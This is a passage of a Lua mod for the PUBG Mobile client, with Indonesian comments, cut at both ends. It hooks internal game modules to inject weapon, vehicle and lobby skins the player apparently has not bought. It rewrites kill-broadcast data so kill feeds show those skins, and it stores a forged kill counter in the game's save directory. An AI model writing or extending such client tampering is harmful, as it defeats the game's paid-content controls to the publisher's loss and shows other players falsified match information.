            pcall(function()
                if self.IsLobbyActor and self:IsLobbyActor() then return end
                local isSelf = self.IsSelf and self:IsSelf()
                if not isSelf then return end
                local char = F.getLocalChar()
                if not char then return end
                _weaponApplied = false
                if not PERF.matchActive then F.bootstrapMatch(char)
                elseif char.AddGameTimer then
                    char:AddGameTimer(0.25, false, function()
                        local c = F.getLocalChar()
                        if c then F.matchApplyWeaponSkin(c) end
                    end)
                end
            end)
        end
    end)
end

function F.hookVehicleInfoInit()
    pcall(function()
        if DataMgr._AddOutfitVehInfoHooked then return end
        DataMgr._AddOutfitVehInfoHooked = true
        local orig = DataMgr.InitVehicleInfo
        DataMgr.InitVehicleInfo = function(vehicle_info, vst_skin)
            vehicle_info = F.mergeInjectedIntoVehicleSlotList(vehicle_info)
            orig(vehicle_info, vst_skin)
            F.later(0.15, function()
                F.reapplyVehicleSlotsFromConfig()
                F.reapplyHallThemeFromConfig()
                LOBBY.reapplyDone = false
                LOBBY.reapplyScheduled = false
                F.scheduleLobbyReapplyOnce()
            end)
        end
    end)
end

function F.hookVehicleSkinDataInit()
    pcall(function()
        if DataMgr._AddOutfitVehSkinDataHooked then return end
        DataMgr._AddOutfitVehSkinDataHooked = true
        local origInit = DataMgr.InitVehicleSkinData
        DataMgr.InitVehicleSkinData = function(data)
            data = F.mergeInjectedVehicleSkinTable(data)
            origInit(data)
            F.later(0.1, function()
                F.equipVehicleTypesFromConfig(PERSIST.configVehicleSlots)
            end)
        end
        local origUpd = DataMgr.UpdateVehicleSkin
        DataMgr.UpdateVehicleSkin = function(itemSubType, putOnId)
            origUpd(itemSubType, putOnId)
            if not _G.AddOutfitApplyingConfig and F.isInjectedIns(putOnId) then
                F.setLobbyVehicleManual(itemSubType, R.insToRes[putOnId], putOnId)
            end
        end
    end)
    pcall(function()
        local HallThemeUtils = require("client.logic.lobby.hall_theme_utils")
        if HallThemeUtils._AddOutfitLobbyVehHooked then return end
        HallThemeUtils._AddOutfitLobbyVehHooked = true
        local orig = HallThemeUtils.ProcPutOnVehicle
        HallThemeUtils.ProcPutOnVehicle = function(putOnItem, bShowVehicle)
            orig(putOnItem, bShowVehicle)
            if not _G.AddOutfitApplyingConfig and putOnItem then
                local ins = tonumber(putOnItem.instid)
                local res = tonumber(putOnItem.res_id)
                if ins and F.isInjectedIns(ins) then
                    F.setLobbyVehicleManual(F.vehicleSubType(res or R.insToRes[ins]), res or R.insToRes[ins], ins)
                end
            end
        end
    end)
end

function F.hookHallTheme()
    pcall(function()
        local HT = require("client.logic.lobby.hall_theme_utils")
        if HT._AddOutfitHallThemeHooked then return end
        HT._AddOutfitHallThemeHooked = true
        local orig = HT.ProcPutOnHallTheme
        HT.ProcPutOnHallTheme = function(putOnItem, putOffItem)
            orig(putOnItem, putOffItem)
            if not _G.AddOutfitApplyingTheme and putOnItem then
                local ins = tonumber(putOnItem.instid)
                local res = tonumber(putOnItem.res_id)
                if ins and F.isInjectedIns(ins) then
                    F.setHallThemeManual(res or R.insToRes[ins], ins)
                end
            end
        end
    end)
end

function F.hookEnterGame()
    if _G.AddOutfitEnterGameHooked then return end
    _G.AddOutfitEnterGameHooked = true
    pcall(function()
        if EventSystem and EventSystem.registEvent and EVENTTYPE_LOBBY and EVENTID_ENTER_GAME_BEGIN then
            EventSystem:registEvent(EVENTTYPE_LOBBY, EVENTID_ENTER_GAME_BEGIN, function()
                F.perfInvalidateLobby()
                F.syncWeaponCacheFromLobby(true)
                F.reapplyVehicleSlotsFromConfig(true)
                F.reapplyHallThemeFromConfig(true)
                pcall(F.applyVehicleSkinsToPC)
                F.stopMatchWatcher()
                _bootstrapNotified = false
            end)
        end
    end)
end

function F.afterInjectApply(firstTime)
    F.mergeInjectedArmorySkins()
    F.cleanArmoryPollution()
    if firstTime then
        F.refreshWardrobeOnce()
        F.persistApplyLoaded()
        F.syncLobbyVehicleResFromIns()
        F.reapplyVehicleSlotsFromConfig(true)
        F.reapplyHallThemeFromConfig(true)
        F.reapplyWeaponsFromConfig()
        F.scheduleLobbyReapplyOnce()
    else
        F.reapplyWeaponsFromConfig()
    end
end



function F.start()
    F.restorePufferHooks()
    F.buildSkinMappings()
    if not _G.AddOutfitPersistLoaded then
        _G.AddOutfitPersistLoaded = true
        F.persistLoadFromDisk()
    end
    F.applyPersistSlotsToCache()
    F.syncGlobalWearSkins()
    
    _G.apply_vehicle_skin = F.matchApplyVehicleSkin
    _G.skinIdMappings = _G.AddOutfitSkinIdMappings
    
    F.hookDepotInit()
    F.hookWardrobeData()
    F.hookPageFilter()
    F.hookArmory()
    F.hookGunSkinId()
    F.hookPutOn()
    F.hookPutDown()
    F.hookVehicles()
    F.hookAirborneClick()
    F.hookVehicleInfoInit()
    F.hookVehicleSkinDataInit()
    F.hookHallTheme()
    F.hookWeaponWear()
    F.hookNotice()
    F.hookAvatarValid()
    F.hookPutOnRsp()
    F.hookAirborneCache()
    F.hookLobbyWeaponCache()
    F.hookLobbySwipePersistence()
    F.hookWardrobePutOnReq()
    F.hookWardrobeWearClicks()
    F.hookMatchAvatar()
    F.hookEquipmentRectify()
    F.hookWeaponSpawn()
    F.hookEnterGame()

-- ==============================================================================
-- [BARU] LOGIC KILL MESSENGER, DEADBOX, PENGHITUNG KILL & ICON DARI KODE CONTOH
-- ==============================================================================
local function decodeExpand(expandContent)
    local ok, exp = pcall(function() return slua.LuaArchiverDecode(LuaStateWrapper, expandContent) or {} end)
    return ok and exp or {}
end

local function encodeExpand(exp)
    return slua.LuaArchiverEncode(LuaStateWrapper, exp or {})
end

local _cachedMyName = nil
local function isMyKill(data)
    if not data then return false end
    if data.bIamCauser then return true end
    -- Optimalisasi: Ambil nama hanya 1 kali saja, hindari panggil C++ SLUA ribuan kali
    if not _cachedMyName then
        local hud = slua_GameFrontendHUD
        if hud then
            local pc = hud:GetPlayerController()
            if slua.isValid(pc) then
                local ch = pc:GetPlayerCharacterSafety()
                if slua.isValid(ch) then _cachedMyName = ch:GetPlayerNameSafety() end
            end
        end
    end
    if not _cachedMyName or _cachedMyName == "" then return false end
    return data.Causer == _cachedMyName or data.CauserRealPlayerName == _cachedMyName or data.CauserPlayerName == _cachedMyName
end

local function getCurrentWeaponSkinID()
    -- [TELAH DIPERBAIKI] Ambil ID Skin senjata yang SEDANG DIPEGANG TANGAN untuk cegah tampil Kill Message salah
    local hud = slua_GameFrontendHUD
    if not hud then return 0 end
    local pc = hud:GetPlayerController()
    if not slua.isValid(pc) then return 0 end
    local ch = pc:GetPlayerCharacterSafety()
    if not slua.isValid(ch) then return 0 end
    
    local currWeapon = ch:GetCurrentWeapon()
    if slua.isValid(currWeapon) and currWeapon.synData then
        local currentSkinID = 0
        pcall(function()
            local synDataRef = slua.IndexReference(currWeapon.synData:Get(7), "defineID")
            local skinID = synDataRef and slua.isValid(synDataRef) and synDataRef.TypeSpecificID or 0
            
            -- Hanya tampilkan Kill Message jika senjata di tangan benar-benar senjata VIP (ID > 1000000)
            if skinID > 1000000 then 
                currentSkinID = skinID
            end
        end)
        return currentSkinID
    end
    return 0
end

local _downloadedAssetsCache = {}
local function downloadTeamAssets(skinID)
    if not skinID or skinID == 0 or skinID == 69 then return end
    -- Optimalisasi: Hanya download 1 kali untuk setiap skin, hindari spam bandwidth dan CPU
    if _downloadedAssetsCache[skinID] then return end
    _downloadedAssetsCache[skinID] = true

    pcall(function()
        local PufferManager = require("client.slua.logic.download.puffer.puffer_manager")
        local PufferConst = require("client.slua.logic.download.puffer_const")
        PufferManager.Download(PufferConst.ENUM_DownloadType.ODPAK, {skinID})
        
        local cfg = CDataTable.GetTableData("TeamKillBroadcast", skinID)
        if cfg then
            if cfg.EffectPath and cfg.EffectPath ~= "" then
                PufferManager.Download(PufferConst.ENUM_DownloadType.ODPAK, {cfg.EffectPath})
            end
            if cfg.BgPath and cfg.BgPath ~= "" then
                PufferManager.Download(PufferConst.ENUM_DownloadType.ODPAK, {cfg.BgPath})
            end
        end
    end)
end

local function patchTeamKill(messageData)
    if not _G.LexusConfig.KillMessage then return messageData end -- [CEGAH JIKA SAKLAR MATI]
    if not messageData or not isMyKill(messageData) then return messageData end
    local currentSkinID = getCurrentWeaponSkinID()
    if not currentSkinID or currentSkinID == 0 or currentSkinID == 69 then return messageData end
    local broadcastCfg = CDataTable.GetTableData("TeamKillBroadcast", currentSkinID)
    if not broadcastCfg or (not broadcastCfg.BgPath and not broadcastCfg.EffectPath) then return messageData end
    pcall(function()
        local exp = decodeExpand(messageData.ExpandDataContent)
        exp.CauserWeaponAvatarID = currentSkinID
        messageData.ExpandDataContent = encodeExpand(exp)
        messageData.bShowBottomBothSidesKillInfo = true
        messageData.bIamCauser = true
        downloadTeamAssets(currentSkinID)
    end)
    return messageData
end

local function installTeamBroadcastHooks()
    local function wrapCopy(mod, tag)
        if not mod then return end
        local impl2 = mod.__inner_impl or mod
        if not impl2 or not impl2.CopyKillOrPutDownMessageDataUserDataToLuaTable then return end
        local key = "__teamKillCopy_" .. tag
        if not impl2[key] then impl2[key] = impl2.CopyKillOrPutDownMessageDataUserDataToLuaTable end
        local O_Copy = impl2[key]
        impl2.CopyKillOrPutDownMessageDataUserDataToLuaTable = function(self, messageData)
            local copied = O_Copy(self, messageData)
            
            -- [OPTIMALISASI ABSOLUT] Jika Kill Message dimatikan -> Lewati semua logic di bawah, kembalikan asli game langsung.
            if not _G.LexusConfig.KillMessage then return copied end
            
            local ok2, result = pcall(function() return patchTeamKill(copied) end)
            if ok2 then return result end
            return copied
        end
    end
    pcall(function() wrapCopy(require("GameLua.Mod.BaseMod.Client.BattleKillBroadcast.BattleKillBroadcastSubSystem"), "base") end)
    pcall(function() wrapCopy(require("GameLua.Mod.SingleTraining.Client.BattleKillBroadcast.BattleKillBroadcastSubSystem"), "training") end)
end

-- Inisialisasi sistem Penghitung Kill
_G.killCountInfo = _G.killCountInfo or {}

local function _PUT_KillPaths()
    return {
        "//storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_kills.dat",
        "//storage/emulated/0/Android/data/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_kills.dat",
        "//storage/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_kills.dat",
        "//storage/emulated/0/Android/data/com.rekoo.pubgm/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_kills.dat",
        "//storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/put_kills.dat",
    }
end

function _G.saveKillCountToFile()
    pcall(function()
        local parts = {}
        for wid, n in pairs(_G.killCountInfo or {}) do
            if tonumber(wid) and tonumber(n) and tonumber(n) > 0 then
                parts[#parts+1] = tostring(wid) .. "=" .. tostring(n)
            end
        end
        local data = table.concat(parts, ";")
        for _, path in ipairs(_PUT_KillPaths()) do
            local f = io.open(path, "w")
            if f then f:write(data) f:close() break end
        end
    end)
end

function _G.loadKillCountFromFile()
    pcall(function()
        for _, path in ipairs(_PUT_KillPaths()) do
            local f = io.open(path, "r")
            if f then
                local s = f:read("*a") or ""
                f:close()
                for part in string.gmatch(s, "[^;]+") do
                    local wid, n = part:match("^(%d+)=(%d+)$")
                    if wid and n then
                        _G.killCountInfo[tonumber(wid)] = tonumber(n)
                    end
                end
                break
            end
        end
    end)
end


-- ==============================================================================
-- PUT KILL COUNTER — lifetime (kayak asli), tiap kill +1 saja, anti double
-- ==============================================================================
_G.killCountInfo = _G.killCountInfo or {}
_G._PUT_LastAddKill = _G._PUT_LastAddKill or {}
_G._PUT_KillVictims = _G._PUT_KillVictims or {}

-- no-op: jangan reset tiap match (biar total lifetime ke-save)
_G.PUT_ResetKillsIfNewMatch = function()
    if not _G._PUT_KillsLoaded then
        _G._PUT_KillsLoaded = true
        if _G.loadKillCountFromFile then _G.loadKillCountFromFile() end
    end
    -- hanya clear daftar victim (anti double), TOTAL kill TETAP (lifetime)
    pcall(function()
        local mid = ""
        pcall(function()
            local GD = package.loaded["GameLua.GameCore.Data.GameplayData"] or require("GameLua.GameCore.Data.GameplayData")
            if GD and GD.GetGameState then
                local gs = GD.GetGameState()
                if gs then
                    mid = tostring(gs.GenerateID or gs.GameID or "")
                end
            end
        end)
        if mid ~= "" and _G._PUT_KillMatchId ~= mid then
            _G._PUT_KillMatchId = mid
            _G._PUT_KillVictims = {}
            _G._PUT_LastAddKill = {}
            -- skin: izinkan apply 1x lagi di match baru
            _G._PUT_MatchSkinReady = false
            _G._PUT_LastMatchWep = nil
        end
    end)
end

_G.addKill = function(weaponID, count, victimKey)
    weaponID = tonumber(weaponID)
    if not weaponID or weaponID <= 0 then return false end

    local now = os.clock()
    _G._PUT_LastAddKill = _G._PUT_LastAddKill or {}
    _G._PUT_KillVictims = _G._PUT_KillVictims or {}

    local vk = nil
    if victimKey ~= nil and victimKey ~= "" and victimKey ~= 0 and victimKey ~= "0" then
        vk = tostring(victimKey)
        -- key sintetis "t0.123:101004" = dedupe short window only, jangan permanent
        if string.sub(vk, 1, 1) == "t" and string.find(vk, ":", 1, true) then
            -- treat as synthetic: use time-bucket so double FileItem same kill collapses
            local bucket = string.format("syn:%.1f:%s", math.floor(now * 5) / 5, tostring(weaponID))
            if _G._PUT_KillVictims[bucket] then
                return false
            end
            _G._PUT_KillVictims[bucket] = true
            vk = nil -- jangan block kill bot berikutnya permanent
        end
    end

    if vk and _G._PUT_KillVictims[vk] then
        return false
    end

    local lastT = _G._PUT_LastAddKill["_t"] or 0
    local lastW = _G._PUT_LastAddKill["_w"]
    local lastV = _G._PUT_LastAddKill["_v"]

    -- double hook frame / same event
    if (now - lastT) < 0.12 then
        if lastW == weaponID then return false end
        if vk and lastV == vk then return false end
    end
    -- same weapon tanpa victim key dalam 0.55s (FileItem double tanpa key)
    if not vk and lastW == weaponID and (now - lastT) < 0.55 then
        return false
    end

    if vk then
        _G._PUT_KillVictims[vk] = true
    end
    _G._PUT_LastAddKill["_t"] = now
    _G._PUT_LastAddKill["_w"] = weaponID
    _G._PUT_LastAddKill["_v"] = vk

    _G.killCountInfo = _G.killCountInfo or {}
    local addN = tonumber(count) or 1
    if addN < 1 then addN = 1 end
    if addN > 1 then addN = 1 end -- never +2 from one call
    _G.killCountInfo[weaponID] = (tonumber(_G.killCountInfo[weaponID]) or 0) + addN
    _G.UpdateMyKillCounter = true
    if _G.saveKillCountToFile then _G.saveKillCountToFile() end
    return true
end

function _G.getKills(weaponID)
    weaponID = tonumber(weaponID)
    if not weaponID then return 0 end
    return tonumber(_G.killCountInfo and _G.killCountInfo[weaponID]) or 0
end


pcall(function()
    local SKillInfo = require("GameLua.Mod.BaseMod.Client.KillInfoTips.KillInfo")
    local SKillInfoModuleManager = require("client.module_framework.ModuleManager")
    local UEnums = _ENV.UEnums
    local ECharacterHealthStatus = import("ECharacterHealthStatus")
    
    if SKillInfo and SKillInfo.__inner_impl and SKillInfo.__inner_impl.FileItem then
        local O_FileItem = SKillInfo.__inner_impl.FileItem
        SKillInfo.__inner_impl.FileItem = function(self, DamageRecordData)
            if not self or not DamageRecordData then return end

            -- [OPTIMALISASI ABSOLUT] Matikan ketiga fungsi -> Kembalikan game asli segera, super ringan
            if not _G.LexusConfig.SkinDeadBox and not _G.LexusConfig.KillCountUI and not _G.LexusConfig.KillMessage then
                return O_FileItem(self, DamageRecordData)
            end

            local LogicKillCounter = SKillInfoModuleManager.GetModule(SKillInfoModuleManager.CommonModuleConfig.LogicKillCounter)
            if not LogicKillCounter then return O_FileItem(self, DamageRecordData) end

            local uCharacter = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController() and slua_GameFrontendHUD:GetPlayerController():GetPlayerCharacterSafety()
            if not uCharacter or not slua.isValid(uCharacter) then return O_FileItem(self, DamageRecordData) end

            local SelfName = uCharacter:GetPlayerNameSafety()
            local bIsCauser = DamageRecordData.Causer == SelfName

            if bIsCauser then
                if DamageRecordData.DamageType == UEnums.DamageType.VehicleDamage then
                    if _G.LexusConfig.SkinDeadBox or _G.LexusConfig.KillMessage then 
                        local carSkinID = _G.CurrentEquipVehicleID or 0
                        if carSkinID ~= 0 then
                            local ExpandData = slua.LuaArchiverDecode(LuaStateWrapper, DamageRecordData.ExpandDataContent) or {}
                            ExpandData.CauserVehicleSkinID = carSkinID
                            if _G.LexusConfig.KillMessage then -- HANYA SAKLAR NYALA BARU PAKSA SKIN DI KILL FEED
                                self:ChangeInfoBgByWeaponAvatarIDLua(carSkinID)
                                DamageRecordData.CauserWeaponAvatarID = carSkinID
                                DamageRecordData.CauserClothAvatarID = _G.SuitSkin or 0
                            end
                            DamageRecordData.ExpandDataContent = slua.LuaArchiverEncode(LuaStateWrapper, ExpandData)
                        end
                    end
                elseif DamageRecordData.CauserWeaponAvatarID ~= 69 and DamageRecordData.CauserClothAvatarID ~= 69 then
                    local currWeapon = uCharacter:GetCurrentWeapon()
                    if currWeapon and slua.isValid(currWeapon) then
                        local defineID = currWeapon:GetItemDefineID()
                        local DefineID = defineID and slua.isValid(defineID) and defineID.TypeSpecificID or 0
                        if DefineID ~= 0 then
                            local ExpandData = slua.LuaArchiverDecode(LuaStateWrapper, DamageRecordData.ExpandDataContent) or {}
                            local hasChanged = false

                            local SupportKillCounter = LogicKillCounter:GetBaseKillCounterIdByWeaponId(DefineID)
                            local hs = DamageRecordData.ResultHealthStatus
                            -- HANYA death final (bukan knockdown) — n=2..5 bikin +2 (knock+kill)
                            local isKill = (hs == ECharacterHealthStatus.FinishedLastBreath)
                            pcall(function()
                                if isKill then return end
                                if hs == nil then return end
                                local n = tonumber(hs)
                                -- beberapa build: FinishedLastBreath numeric ~3 atau 4 saja
                                if n == 3 or n == 4 then
                                    isKill = true
                                end
                            end)
                            if isKill then
                                local SkinID = 0
                                pcall(function()
                                    if currWeapon.synData and currWeapon.synData.Get then
                                        local synDataRef = slua.IndexReference(currWeapon.synData:Get(7), "defineID")
                                        if synDataRef then SkinID = tonumber(synDataRef.TypeSpecificID) or 0 end
                                    end
                                end)
                                if SkinID < 1000000 and _G.AddOutfitLastAppliedSkin and DefineID > 0 then
                                    SkinID = tonumber(_G.AddOutfitLastAppliedSkin[DefineID]) or 0
                                end
                                local counterKey = (SkinID > 1000000) and SkinID or DefineID
                                if _G.LexusConfig.KillCountUI and counterKey and counterKey > 0 then
                                        ExpandData.KillCounterItemId = counterKey
                                        local victimKey = nil
                                        pcall(function()
                                            victimKey = DamageRecordData.VictimPlayerKey
                                                or DamageRecordData.TargetPlayerKey
                                                or DamageRecordData.PlayerKey
                                                or DamageRecordData.VictimUID
                                        end)
                                        if not victimKey or victimKey == 0 or victimKey == "" then
                                            -- bot sering tanpa key: pakai clock + define biar tiap kill beda
                                            victimKey = string.format("t%.4f:%s", os.clock(), tostring(DefineID))
                                        end
                                        local added = _G.addKill(counterKey, 1, victimKey)
                                        -- mirror angka ke base ID tanpa +1 lagi (UI kadang baca DefineID)
                                        if counterKey ~= DefineID then
                                            _G.killCountInfo[DefineID] = _G.getKills(counterKey)
                                        end
                                        ExpandData.KillCounterNum = _G.getKills(counterKey)
                                        -- kalau addKill menolak (double), jangan anggap changed dari kill
                                        if not added then
                                            -- tetap boleh hasChanged dari path lain; angka tidak naik
                                        end

                                        hasChanged = true
                                    end
                                    if _G.LexusConfig.SkinDeadBox then 
                                        _G.NeedCheckDeadBoxTimer = 5 
                                        hasChanged = true
                                    end
                                end

                            if hasChanged or _G.LexusConfig.KillMessage then
                                _G.UpdateMyKillCounter = true
                                if _G.LexusConfig.KillMessage then -- HANYA SAKLAR NYALA BARU UBAH PAKET DATA UNTUK TAMPIL DI ATAS
                                    local synData = currWeapon.synData
                                    if synData and slua.isValid(synData) then
                                        local weaponDefineID = slua.IndexReference(synData:Get(7), "defineID")
                                        if weaponDefineID and slua.isValid(weaponDefineID) then
                                            DamageRecordData.CauserWeaponAvatarID = weaponDefineID.TypeSpecificID
                                        end
                                    end
                                    DamageRecordData.CauserClothAvatarID = _G.SuitSkin or 0
                                end
                                DamageRecordData.ExpandDataContent = slua.LuaArchiverEncode(LuaStateWrapper, ExpandData)
                            end
                        end
                    end
                end
            end
            O_FileItem(self, DamageRecordData)
        end
    end
end)

-- Hook UI Penghitung Kill (Update angka & Icon di layar)
pcall(function()
    local MyMainKillCounter = require("GameLua.Mod.BaseMod.Client.KillCounter.MainKillCounter")
    local MyKillCountSubSystem = require("GameLua.Mod.BaseMod.Client.KillCounter.KillCounterUISubsystem")
    local MyMainWeaponInfoItemUI = require("GameLua.Mod.BaseMod.Client.Backpack.MainWeaponInfoItemUI")
    local MyMainWeaponKillCounter = require("GameLua.Mod.BaseMod.Client.KillCounter.MainWeaponKillCounter")
    local SlotBase = require("GameLua.Mod.BaseMod.Client.MainControlUI.SwitchWeaponSlotMode2")
    local SubsystemMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
    local UIManager = require("client.slua_ui_framework.manager")
    local ModuleManager = require("client.module_framework.ModuleManager")

    if MyKillCountSubSystem and MyKillCountSubSystem.__inner_impl then
        _G.OurkillCountSystem = MyKillCountSubSystem.__inner_impl
        
        local o_OnRefreshUI = MyMainKillCounter.__inner_impl.OnRefreshUI
        MyMainKillCounter.__inner_impl.OnRefreshUI = function(self, _, _, UID)
            if not _G.LexusConfig.KillCountUI then return end -- CEGAH SAAT DIMATIKAN
            local LogicKillCounter = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.LogicKillCounter)
            local curEquipedKillCounter = LogicKillCounter:GetEquipedKillCounterId(6114302174, self.WeaponID)
            local uCharacter = slua_GameFrontendHUD:GetPlayerController():GetPlayerCharacterSafety()
            local currweapon = uCharacter:GetCurrentWeapon()
            if currweapon ~= nil then
                local defineID = currweapon:GetItemDefineID()
                local DefineID = defineID and slua.isValid(defineID) and defineID.TypeSpecificID or 0
                local synDataRef = slua.IndexReference(currweapon.synData:Get(7), "defineID")
                local SkinID = synDataRef and slua.isValid(synDataRef) and synDataRef.TypeSpecificID or 0
                self.KillCounterItem:SetKillCounterItemShowWithNum(curEquipedKillCounter, _G.getKills(DefineID), SkinID)
            end
        end

        MyKillCountSubSystem.__inner_impl.CheckSupportKCUI = function(self) return _G.LexusConfig.KillCountUI end

        local o_UpdateMainKillCounterUI = MyKillCountSubSystem.__inner_impl.UpdateMainKillCounterUI
        MyKillCountSubSystem.__inner_impl.UpdateMainKillCounterUI = function(self, bShow, WeaponID, AvatarID)
            -- [OPTIMALISASI ABSOLUT] Cegah panggilan UI Game saat mati, CEK BERKEDIP (FLASH)
            if not _G.LexusConfig.KillCountUI then
                o_UpdateMainKillCounterUI(self, false, WeaponID, AvatarID) -- Paksa parameter False
                local MainKillCounter = UIManager.GetUI(UIManager.UI_Config_InGame.MainKillCounter)
                if MainKillCounter then UIManager.CloseUI(UIManager.UI_Config_InGame.MainKillCounter) end
                return
            end

            o_UpdateMainKillCounterUI(self, bShow, WeaponID, AvatarID)
            local MainKillCounter = UIManager.GetUI(UIManager.UI_Config_InGame.MainKillCounter)
            local uCharacter = slua_GameFrontendHUD:GetPlayerController():GetPlayerCharacterSafety()
            local currweapon = uCharacter:GetCurrentWeapon()
         
            if not bShow and MainKillCounter then
                UIManager.CloseUI(UIManager.UI_Config_InGame.MainKillCounter)
            elseif bShow and currweapon ~= nil then
                local DefineID = currweapon:GetItemDefineID().TypeSpecificID
                local currentEquipAvatrid = slua.IndexReference(currweapon.synData:Get(7), "defineID").TypeSpecificID
                local LogicKillCounter = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.LogicKillCounter)
                local SupportKillCounter = LogicKillCounter:GetBaseKillCounterIdByWeaponId(DefineID)
                
                local curEquipedKillCounter = LogicKillCounter:GetEquipedKillCounterId(6114302174, currentEquipAvatrid)
                
                -- [OPTIMALISASI FPS] IDENTIFIKASI SENJATA MOD: Senjata biasa ID < 1.000.000, Senjata Mod ID > 1.000.000
                local isModdedSkin = (currentEquipAvatrid and currentEquipAvatrid > 1000000)
                
                -- Tutup UI jika pistol, pisau, WAJAN atau SENJATA BIASA TANPA SKIN
                if (SupportKillCounter == nil or not isModdedSkin) then
                    if MainKillCounter then
                        UIManager.CloseUI(UIManager.UI_Config_InGame.MainKillCounter)
                    end
                else
                    -- Tampilkan UI jika senjata Mod (Meski curEquipedKillCounter nil karena server tidak mengenali)
                    if not MainKillCounter then
                        UIManager.ShowUI(UIManager.UI_Config_InGame.MainKillCounter, DefineID, currentEquipAvatrid)
                        MainKillCounter = UIManager.GetUI(UIManager.UI_Config_InGame.MainKillCounter)
                        if MainKillCounter then
                            MainKillCounter:SetKillCounterItemShowWithNum(curEquipedKillCounter, _G.getKills(DefineID), currentEquipAvatrid)
                        end
                    else
                        MainKillCounter:UpdateWeaponID(DefineID, currentEquipAvatrid)
                        MainKillCounter:SetKillCounterItemShowWithNum(curEquipedKillCounter, _G.getKills(DefineID), currentEquipAvatrid)
                    end
                end
            end
        end

        local o_CheckNeedMainKillCounterUI = MyKillCountSubSystem.__inner_impl.CheckNeedMainKillCounterUI
        MyKillCountSubSystem.__inner_impl.CheckNeedMainKillCounterUI = function(self, Weapon, PlayerID)
            if not _G.LexusConfig.KillCountUI then return end -- CEGAH SAAT DIMATIKAN
            local uCharacter = slua_GameFrontendHUD:GetPlayerController():GetPlayerCharacterSafety()
            local currweapon = uCharacter:GetCurrentWeapon()
            if currweapon ~= nil then
                local defineID = currweapon:GetItemDefineID()
                local DefineID = defineID and slua.isValid(defineID) and defineID.TypeSpecificID or 0
                local synDataRef = slua.IndexReference(currweapon.synData:Get(7), "defineID")
                local SkinID = synDataRef and slua.isValid(synDataRef) and synDataRef.TypeSpecificID or 0
                self:UpdateMainKillCounterUI(true, DefineID, SkinID)
            end
        end
    end
end)

-- Loop Updater (Sudah dioptimalisasi Cache: Hanya Update UI saat ganti senjata atau ada kill)
local _lastKCWeaponID = 0
local _lastKCSkinID = 0

_G.GameAvatarHandlerkillcounter = function()
    local UIManager = require("client.slua_ui_framework.manager")
    
    if not _G.LexusConfig.KillCountUI then
        local MainKillCounter = UIManager.GetUI(UIManager.UI_Config_InGame.MainKillCounter)
        if MainKillCounter then UIManager.CloseUI(UIManager.UI_Config_InGame.MainKillCounter) end
        return 
    end

    local PlayerController = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
    if not PlayerController or not slua.isValid(PlayerController) then return end
    
    local uCharacter = PlayerController:GetPlayerCharacterSafety()
    if not uCharacter or not slua.isValid(uCharacter) then return end
    
    local currweapon = uCharacter:GetCurrentWeapon()
    if currweapon and slua.isValid(currweapon) then
        -- Ambil DefineID aman, tidak buat sampah RAM
        local defineIDObj = currweapon:GetItemDefineID()
        local currentWeaponID = (defineIDObj and slua.isValid(defineIDObj)) and defineIDObj.TypeSpecificID or 0
        
        -- Ambil Skin ID dari Cache sistem Skin V7.5 (Super ringan, tidak panggil SLUA)
        local currentSkinID = 0
        if _G.AddOutfitLastAppliedSkin and _G.AddOutfitLastAppliedSkin[currentWeaponID] then
            currentSkinID = _G.AddOutfitLastAppliedSkin[currentWeaponID]
        end

        -- OPTIMALISASI EKSTREM: Hanya kirim perintah update UI jika BARU GANTI SENJATA atau BARU BUNUH
        if _G.UpdateMyKillCounter or currentWeaponID ~= _lastKCWeaponID or currentSkinID ~= _lastKCSkinID then
            _lastKCWeaponID = currentWeaponID
            _lastKCSkinID = currentSkinID
            local need = _G.UpdateMyKillCounter
            _G.UpdateMyKillCounter = false
            
            if _G.OurkillCountSystem then
                pcall(function()
                    _G.OurkillCountSystem:UpdateMainKillCounterUI(true, currentWeaponID, currentSkinID)
                end)
                -- retry 1x jika angka baru (kadang UI belum ready mid-game)
                if need then
                    pcall(function()
                        local ticker = require("common.time_ticker")
                        if ticker and ticker.AddTimerOnce then
                            ticker.AddTimerOnce(0.15, function()
                                pcall(function()
                                    if _G.OurkillCountSystem and _G.LexusConfig and _G.LexusConfig.KillCountUI then
                                        _G.OurkillCountSystem:UpdateMainKillCounterUI(true, currentWeaponID, currentSkinID)
                                    end
                                end)
                            end)
                        end
                    end)
                end
            end
        end
    else
        _lastKCWeaponID = 0
        _lastKCSkinID = 0
        local MainKillCounter = UIManager.GetUI(UIManager.UI_Config_InGame.MainKillCounter)
        if MainKillCounter then UIManager.CloseUI(UIManager.UI_Config_InGame.MainKillCounter) end
    end
end

local function LobbyTickSetup()
    if not _G.CounterUpdated then
        _G.CounterUpdated = true
        _G.loadKillCountFromFile()
    end
    -- TELAH DIHAPUS LOGIC SCAN FILE translateec.conf TERUS-MENERUS YANG MENYEBABKAN LAG
end

-- Aktifkan Hooks dan Loop
pcall(function()
    installTeamBroadcastHooks()
    LobbyTickSetup() -- Hanya panggil baca file 1 kali saat masuk game, tidak diulang lagi
    
    local ticker = require("common.time_ticker")
    if ticker and ticker.AddTimerLoop then
        ticker.AddTimerLoop(0, _G.GameAvatarHandlerkillcounter, -1, 0.5)
        -- TELAH DIHAPUS LOOP BACA FILE 0.4 DETIK UNTUK HINDARI DROP FPS
    end
end)
-- ==============================================================================

    F.startVehicleSkinTicker()
    if not _G.AddOutfitVehInitTimers then
        _G.AddOutfitVehInitTimers = true
        F.later(1.5, function() pcall(F.applyVehicleSkinsToPC) end)
        F.later(4.0, function() pcall(F.applyVehicleSkinsToPC) end)
    end

    pcall(function()
        if F.isInRealMatch() then
            local char = F.getLocalChar()
            if char then
                F.bootstrapMatch(char)
            end
        end
    end)

    local firstLobby = not _G.AddOutfitLobbyInitDone
    if F.injectAll() then
        if firstLobby then _G.AddOutfitLobbyInitDone = true end
